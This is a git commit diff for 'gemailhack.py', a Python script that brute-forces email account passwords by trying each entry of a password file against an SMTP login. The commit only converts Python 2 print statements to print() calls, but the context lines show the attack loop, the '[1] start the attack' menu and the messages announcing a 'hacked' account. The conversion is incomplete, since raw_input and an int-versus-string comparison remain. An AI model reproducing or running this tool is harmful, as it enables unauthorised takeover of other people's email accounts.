4a6ce4a8eeedf2b9c04a4d9e730557eb1e132ba6
NuhDev <92098247+NuhDevX@users.noreply.github.com>
2025-03-23 23:15:37 +0700

    Update gemailhack.py

--- gemailhack.py
+++ gemailhack.py
@@ -5,39 +5,39 @@ import smtplib
 from os import system
 
 def main():
-   print '================================================='
-   print '               create by Ha3MrX                  '
-   print '================================================='
-   print '               ++++++++++++++++++++              '
-   print '\n                                               '
-   print '  _,.                                            '
-   print '                                                 '
-   print '                                                 '
-   print '           HA3MrX                                '
-   print '       _,.                   '
-   print '     ,` -.)                  '
-   print '    ( _/-\\-._               '
-   print '   /,|`--._,-^|            , '
-   print '   \_| |`-._/||          , | '
-   print '     |  `-, / |         /  / '
-   print '     |     || |        /  /  '
-   print '      `r-._||/   __   /  /   '
-   print '  __,-<_     )`-/  `./  /    '
-   print '  \   `---    \   / /  /     '
-   print '     |           |./  /      '
-   print '     /           //  /       '
-   print ' \_/  \         |/  /        '
-   print '  |    |   _,^- /  /         '
-   print '  |    , ``  (\/  /_         '
-   print '   \,.->._    \X-=/^         '
-   print '   (  /   `-._//^`           '
-   print '    `Y-.____(__}             '
-   print '     |     {__)              ' 
-   print '           ()   V.1.0        '
+   print ('=================================================')
+   print ('               create by Ha3MrX                  ')
+   print ('=================================================')
+   print ('               ++++++++++++++++++++              ')
+   print ('\n                                               ')
+   print ('  _,.                                            ')
+   print ('                                                 ')
+   print ('                                                 ')
+   print ('           HA3MrX                                ')
+   print ('       _,.                   ')
+   print ('     ,` -.)                  ')
+   print ('    ( _/-\\-._               ')
+   print ('   /,|`--._,-^|            , ')
+   print ('   \_| |`-._/||          , | ')
+   print ('     |  `-, / |         /  / ')
+   print ('     |     || |        /  /  ')
+   print ('      `r-._||/   __   /  /   ')
+   print ('  __,-<_     )`-/  `./  /    ')
+   print ('  \   `---    \   / /  /     ')
+   print ('     |           |./  /      ')
+   print ('     /           //  /       ')
+   print (' \_/  \         |/  /        ')
+   print ('  |    |   _,^- /  /         ')
+   print ('  |    , ``  (\/  /_         ')
+   print ('   \,.->._    \X-=/^         ')
+   print ('   (  /   `-._//^`           ')
+   print ('    `Y-.____(__}             ')
+   print ('     |     {__)              ' )
+   print ('           ()   V.1.0        ')
 
 main()
-print '[1] start the attack'
-print '[2] exit'
+print ('[1] start the attack')
+print ('[2] exit')
 option = input('==>')
 if option == 1:
    file_path = raw_input('path of passwords file :')
@@ -53,22 +53,22 @@ def login():
     server.ehlo()
     for password in pass_list:
       i = i + 1
-      print str(i) + '/' + str(len(pass_list))
+      print (str(i) + '/' + str(len(pass_list)))
       try:
          server.login(user_name, password)
          system('clear')
          main()
-         print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print ('\n')
+         print ('[+] This Account Has Been Hacked Password :' + password + '     ^_^')
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print ('[+] this account has been hacked, password :' + password + '     ^_^')
 
             break
          else:
-            print '[!] password not found => ' + password
+            print ('[!] password not found => ' + password)
 login()
